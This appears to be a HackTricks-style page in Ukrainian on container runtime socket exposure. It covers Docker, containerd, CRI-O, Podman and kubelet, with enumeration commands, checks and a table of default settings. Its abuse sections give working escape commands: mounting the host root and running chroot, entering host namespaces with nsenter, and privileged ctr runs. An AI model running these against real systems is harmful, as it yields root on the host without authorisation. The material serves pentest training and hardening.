# Експозиція Runtime API та демонів

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних зламів контейнерів взагалі не починаються з namespace escape. Вони починаються з доступу до контрольної площини runtime. Якщо робоче навантаження може спілкуватися з `dockerd`, `containerd`, CRI-O, Podman, або kubelet через змонтований Unix socket або відкритий TCP-лістенер, зловмисник може запросити новий контейнер з вищими привілеями, змонтувати файлову систему хоста, приєднатися до namespace'ів хоста або отримати конфіденційну інформацію вузла. У таких випадках runtime API є справжньою межею безпеки, і її компрометація фактично близька до компрометації хоста.

Ось чому експозиція runtime socket має документуватися окремо від захистів ядра. Контейнер із звичайними seccomp, capabilities та MAC confinement все одно може бути в один API-виклик від компрометації хоста, якщо `/var/run/docker.sock` або `/run/containerd/containerd.sock` змонтовано всередині нього. Ізоляція ядра поточного контейнера може працювати саме так, як задумано, тоді як управлінська площина runtime залишається повністю відкритою.

## Моделі доступу до демонів

Docker Engine традиційно відкриває свій привілейований API через локальний Unix socket за адресою `unix:///var/run/docker.sock`. Історично він також міг бути експонований віддалено через TCP-лістенери, такі як `tcp://0.0.0.0:2375` або TLS-захищений лістенер на `2376`. Відкриття демона віддалено без надійного TLS і автентифікації клієнта фактично перетворює Docker API на інтерфейс віддаленого root.

containerd, CRI-O, Podman, і kubelet надають подібні критичні інтерфейси. Назви та робочі потоки відрізняються, але логіка — ні. Якщо інтерфейс дозволяє виклику створювати workloads, монтувати шляхи хоста, отримувати облікові дані або змінювати запущені контейнери, то такий інтерфейс є привілейованим каналом управління і повинен розглядатися відповідно.

Звичайні локальні шляхи, які варто перевірити є:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Older or more specialized stacks may also expose endpoints such as `dockershim.sock`, `frakti.sock`, or `rktlet.sock`. Those are less common in modern environments, but when encountered they should be treated with the same caution because they represent runtime-control surfaces rather than ordinary application sockets.

## Захищений віддалений доступ

Якщо daemon має бути доступний поза межами локального сокета, з'єднання слід захищати за допомогою TLS і, бажано, із взаємною автентифікацією, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара звичка відкривати Docker daemon через plain HTTP для зручності — одна з найнебезпечніших помилок в адмініструванні контейнерів, бо поверхня API достатньо потужна, щоб безпосередньо створювати привілейовані контейнери.

Історичний шаблон конфігурації Docker виглядав так:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
На хостах на базі systemd комунікація демона також може відображатися як `fd://`, що означає, що процес успадковує від systemd вже відкритий socket замість того, щоб прив'язувати його самостійно. Головний висновок — не точний синтаксис, а наслідок для безпеки. Як тільки демон починає слухати поза межами строго дозованого локального socket, transport security та client authentication стають обов'язковими, а не факультативними заходами жорсткого зміцнення.

## Зловживання

Якщо присутній runtime socket, підтвердіть, який саме це socket, чи існує сумісний client, і чи можливий доступ raw HTTP або gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ці команди корисні, оскільки вони дозволяють розрізнити між мертвим шляхом, змонтованим але недоступним socket, і живим привілейованим API. Якщо клієнт підключається успішно, наступне питання — чи може API запустити новий контейнер з host bind mount або host namespace sharing.

### Повний приклад: Docker Socket To Host Root

Якщо `docker.sock` доступний, класичний escape — запустити новий контейнер, який змонтує кореневу файлову систему хоста і потім виконати `chroot` у неї:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Це забезпечує пряме host-root виконання через Docker daemon. Наслідки не обмежуються лише file reads. Опинившись всередині нового container, attacker може змінювати host files, збирати credentials, закріплювати persistence або запускати додаткові privileged workloads.

### Повний приклад: Docker Socket To Host Namespaces

Якщо attacker віддає перевагу namespace entry замість filesystem-only access:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Цей шлях досягає хоста, просячи runtime створити новий container з явним доступом до host-namespace, а не експлуатуючи поточний.

### Повний приклад: containerd Socket

Змонтований `containerd` socket зазвичай так само небезпечний:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Наслідком знову є компрометація хоста. Навіть якщо специфічні для Docker інструменти відсутні, інший runtime API все ще може надати ті самі адміністративні повноваження.

## Перевірки

Метою цих перевірок є визначити, чи може контейнер досягти будь-якої площини управління, яка мала залишатися за межами межі довіри.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Цікавого тут:

- Монтований runtime socket зазвичай є прямим адміністративним примітивом, а не просто розкриттям інформації.
- TCP-слухач на `2375` без TLS слід розглядати як ознаку віддаленої компрометації.
- Змінні середовища, такі як `DOCKER_HOST`, часто вказують, що робоче навантаження було спеціально призначене для взаємодії з runtime хоста.

## Налаштування runtime за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням — локальний Unix-сокет | `dockerd` слухає на локальному сокеті, а демон зазвичай має права root | монтування `/var/run/docker.sock`, експонування `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | За замовчуванням — CLI без демона | Для звичайного локального використання не потрібен довгоживучий привілейований демон; API-сокети все ж можуть бути відкриті, коли увімкнено `podman system service` | експонування `podman.sock`, запуск сервісу для широкого кола, використання API з правами root |
| containerd | Локальний привілейований сокет | Адміністративний API відкритий через локальний сокет і зазвичай використовується інструментами вищого рівня | монтування `containerd.sock`, широкий доступ через `ctr` або `nerdctl`, експонування привілейованих просторів імен |
| CRI-O | Локальний привілейований сокет | CRI endpoint призначений для довірених компонентів локального вузла | монтування `crio.sock`, експонування CRI endpoint для недовірених робочих навантажень |
| Kubernetes kubelet | Node-local management API | Kubelet не повинен бути широко доступним із Pods; доступ може розкрити стан Pod, облікові дані та можливості виконання залежно від authn/authz | монтування kubelet сокетів або сертифікатів, слабка автентифікація kubelet, host networking плюс доступний kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
